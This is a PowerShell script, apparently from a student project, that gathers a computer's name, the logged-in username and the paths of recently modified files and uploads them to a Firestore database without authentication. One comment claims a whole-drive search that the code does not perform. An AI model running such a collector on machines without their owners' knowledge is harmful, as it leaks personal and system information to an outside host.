# Define the URL for the Firestore database
$projectID = "bachelor-7e242"  # Your project ID
$collectionName = "machines"  # Target collection

# Get the name of the PC
$pcName = [System.Environment]::MachineName

# Get the current user's username
$userName = [System.Environment]::UserName

# Escape spaces in the PC name
$escapedPcName = $pcName.Replace(" ", "%20")

# Define the URL for the document
$documentUrl = "https://firestore.googleapis.com/v1/projects/$projectID/databases/(default)/documents/$collectionName/$escapedPcName"

# Create or update a document with a dummy field to initialize
$newDocBody = @{
    fields = @{
        dummyField = @{ stringValue = "init" }
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $newDocBody -ContentType 'application/json'
    Write-Output "Document created or updated with dummy field"
} catch {
    Write-Error "Error creating or updating document: $_"
}

# Wait to ensure the document is created or updated
Start-Sleep -Seconds 5

# Define the URL for the new sub-collection with the current date and time as the name
$dateTimeCollectionName = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
$newCollectionUrl = "$documentUrl/$dateTimeCollectionName"

# Define the count of most recent files to retrieve
$count = 2

# Retrieve the 2 most recently modified files from the entire C: drive
$recentFiles = Get-ChildItem -Path .\ -Recurse -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First $count -ExpandProperty FullName

# Create a JSON body for the POST request
$body = @{
    fields = @{
        pcName = @{ stringValue = $pcName }
        userName = @{ stringValue = $userName }
        fileNames = @{ arrayValue = @{ values = $recentFiles | ForEach-Object { @{ stringValue = $_ } } } }
    }
} | ConvertTo-Json -Depth 10

# Define HTTP headers
$headers = @{
    "Content-Type" = "application/json"
}

# Send the POST request to create the new sub-collection and store the information
try {
    $response = Invoke-RestMethod -Uri $newCollectionUrl -Method Post -Body $body -Headers $headers
    Write-Output "Response from Firestore: $response"
} catch {
    Write-Error "Error sending data to Firestore: $_"
}

# Remove the dummy field
$removeDummyField = @{
    fields = @{
        dummyField = @{ nullValue = $null }
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $removeDummyField -ContentType 'application/json'
    Write-Output "Dummy field removed from the document"
} catch {
    Write-Error "Error removing dummy field from the document: $_"
}
